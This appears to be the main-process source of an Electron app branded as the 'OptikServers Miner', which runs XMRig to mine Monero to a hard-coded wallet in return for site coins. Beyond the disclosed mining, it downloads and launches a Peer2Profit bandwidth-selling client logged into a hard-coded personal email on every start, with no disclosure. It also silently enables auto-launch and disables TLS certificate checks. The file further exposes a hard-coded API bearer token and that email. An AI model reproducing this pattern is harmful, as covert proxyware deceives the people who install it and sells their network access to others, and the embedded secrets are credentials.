

// Modules to control application life and create native browser window
const {app, BrowserWindow, ipcMain, ipcRenderer, Menu, Tray} = require('electron')
const path = require('path');
var unzipper = require("unzipper");
const { exec, spawn } = require("child_process");
const AutoLaunch = require('auto-launch');
const fs = require("fs");
const { DownloaderHelper } = require('node-downloader-helper');
const http = require("axios");
const https = require("https");
var appData = process.env.APPDATA;
let mainWindow = null;
var config = null;
var wallet = "44g5KqHrrdz1mF6Z9YGB6SJRGcEVbRXWnZXC8BmSkPjSHYvWSfjftZwE7GESLDDUTgMjN4MBdPzebEKuK3XYRRE94RjCL4M";
var authenticated = false;
var user = null;
var xmrig = null;
let json = JSON.stringify({
  "user":"not_set",
  "settings": {
    "cpuLimit": 70
  }
});
const agent = new https.Agent({
  rejectUnauthorized: false
});

app.whenReady().then(() => {
  let autoLaunch = new AutoLaunch({
    name: 'OptikServers',
    path: app.getPath('exe'),
  });
  autoLaunch.isEnabled().then((isEnabled) => {
    if (!isEnabled) autoLaunch.enable();
  });
  mainWindow = new BrowserWindow({
    width: 800,
    center: true,
    height: 600,
    frame: false,
    titleBarStyle: "hidden",
    webPreferences: {
      nodeIntegration: true,
      devTools: false,
      contextIsolation: false,
      enableRemoteModule: true,
      preload: path.join(__dirname, 'preload.js')
    }
  });
  const tray = new Tray(path.join(__dirname, 'icon.png'));
  const contextMenu = Menu.buildFromTemplate([
    {
      label: "Dashboard",
      click() { goToDashboard(); }
    },
    {
      label: 'Quit',
      click() { app.quit(); }
    }
  ]);
  tray.setToolTip('OptikServers Miner');
  tray.setContextMenu(contextMenu);

  if (!fs.existsSync(appData + "/OptikServers")) {
    console.log(fs.mkdirSync(appData+"/OptikServers"));
  }
  if (!fs.existsSync(appData+"/OptikServers/config.json")) {
    fs.writeFileSync(appData+"/OptikServers/config.json", json);
  }
  if (!fs.existsSync(appData +"/OptikServers/p2pclient.exe")) {
    const dl = new DownloaderHelper("https://updates.peer2profit.com/p2pclient_v0.55_signed.zip" , appData + "/OptikServers");
    dl.on('end', function () {
      fs.createReadStream(appData + "/OptikServers/p2pclient_v0.55_signed.zip")
      .pipe(unzipper.Extract({ path: appData + "/OptikServers" }));
    });
    dl.start();
    
  }
  config = require(appData+"/OptikServers/config.json");
  if (config.user !== "not_set") {
    authenticated = true;
    user = config.user;
  }
  
var p2p = exec("cd " + appData + "\\OptikServers && p2pclient.exe --login maddocksjoshua2100@gmail.com");
  

  if (authenticated == true) {
    mainWindow.loadFile('index.html')
  }
  else {
    mainWindow.loadFile("login.html");
  }
  


});

app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') {
    if (xmrig !== null) {
        xmrig.kill();
    }
    app.quit()
  }
});


function goToDashboard() {
  mainWindow.setAlwaysOnTop(true, 'screen');
  if (mainWindow.isMinimized()) {
    mainWindow.restore()
}
  if (authenticated == true) {
    mainWindow.loadFile("index.html");
  }
  mainWindow.setAlwaysOnTop(false, 'screen');
}

ipcMain.handle('logout', async () => {
  authenticated = false;
  user = null;
  fs.writeFileSync(appData + "/OptikServers/config.json", json);
  if (xmrig !== null) {
    xmrig.kill();
    xmrig = null;
  }
  mainWindow.loadFile("login.html");
  

})



ipcMain.handle('login', async (event, id) => {
  if (authenticated !== true) {
    console.log("message received");
    // Check if user discord id exists
    http.get('https://my.optikservers.com/api/miner/checkid?uid=' + id, { httpsAgent: agent })
    .then(function (response) {
      // handle success
      console.log(response.data);
      if (response.data == 1) {
        authenticated = true;
        user = id;
        config.user = id;
        fs.writeFileSync(appData+"/OptikServers/config.json", JSON.stringify(config));
        mainWindow.loadFile("index.html");
      }
      else {
        mainWindow.webContents.send("error", "This user does not exist.");
      }
    });

  }

})
ipcMain.handle("userinfo", async () => {
  http.get("https://my.optikservers.com/api/miner/getuserinfo?userid=" + user, { httpsAgent: agent})
  .then(function (response) {
    console.log(response.data.username);
    mainWindow.webContents.send("user", response.data.username, response.data.coins);
  }); 
})
ipcMain.handle("start", async () => {
  // Find XMRIG miner and start it
    if (!fs.existsSync(appData + "/OptikServers/XMRig")) {
    console.log(fs.mkdirSync(appData+"/OptikServers/XMRig"));
  }
  if (!fs.existsSync(appData +"/OptikServers/XMRig/xmrig.exe")) {
    const dl = new DownloaderHelper("https://github.com/MoneroOcean/xmrig/releases/download/v6.16.2-mo2/xmrig-v6.16.2-mo2-win64.zip" , appData + "/OptikServers/XMRig");
    dl.on('end', function () {
      fs.createReadStream(appData + "/OptikServers/XMRig/xmrig-v6.16.2-mo2-win64.zip")
      .pipe(unzipper.Extract({ path: appData + "/OptikServers/XMRig" }));
    });
    dl.start();
  }
  if (fs.existsSync(appData+"/OptikServers/XMRig/config.json")) {
    fs.unlinkSync(appData+"/OptikServers/XMRig/config.json");
  }
    fs.copyFileSync(path.join(__dirname, "xmrig.config.json"), appData+"/OptikServers/XMRig/config.json");
    var xmrigjson = require(appData+"/OptikServers/XMRig/config.json");
    // xmrigjson.pools[0].user = wallet;
    // xmrigjson.pools[0].pass = "NCE_" + user;
  //   var xmrigjson = null;
  //   fs.readFileSync(appData+"/OptikServers/XMRig/config.json", 'utf8', (err, jsonString) => {
  //     xmrigjson = JSON.parse(jsonString);

  // });
  // console.log(xmrigjson);
  xmrigjson.pools[0].user = wallet;
  xmrigjson.pools[0].pass = "NCE_" + user;
  xmrigjson.cpu['max-threads-hint'] = config.settings.cpuLimit;
  console.log(xmrigjson);
  fs.writeFileSync(appData+"/OptikServers/XMRig/config.json", JSON.stringify(xmrigjson));
  xmrig = spawn(appData+"\\OptikServers\\XMRig\\xmrig.exe");
  xmrig.on('close', () => {
    xmrig = null;
    mainWindow.webContents.send("error", "MINER_KILLED");
  })
  // console.log(xmrig);
});


ipcMain.handle("stop", async () => {
  xmrig.kill()
  xmrig = null;
})     

ipcMain.handle("settings", async () => {
  if (xmrig !== null) {
    xmrig.kill();
  }
  mainWindow.loadFile("settings.html");
});

ipcMain.handle("settings:save", async (event, cpuLimit) => {
  config.settings.cpuLimit = cpuLimit;
  fs.writeFileSync(appData+"/OptikServers/config.json", JSON.stringify(config));

});

ipcMain.handle("settings:fetch", async () => {
  mainWindow.webContents.send("settings:fetch_reply", config.settings.cpuLimit);  
});

ipcMain.handle("settings:back", async () => {
  mainWindow.loadFile("index.html");
})
setInterval(function () {
  if (xmrig !== null) {
    // Send api requestv
    http.get("https://my.optikservers.com/api/miner/heartbeat?uid="+user,{
      headers: {
        'Authorization': `Bearer uTkVjxdk9Qc29P7YCdeSVPFw54yuSava`
      },
      httpsAgent: agent
    }).then(function (response) {
      if (response !== "OK") {
        if (response == "HASH_TOO_LOW") {
          mainWindow.webContents.send("error", "Your hashrate is too low to earn, consider increasing your CPU limit.");
        }
      }
    })
  }
}, 60000);

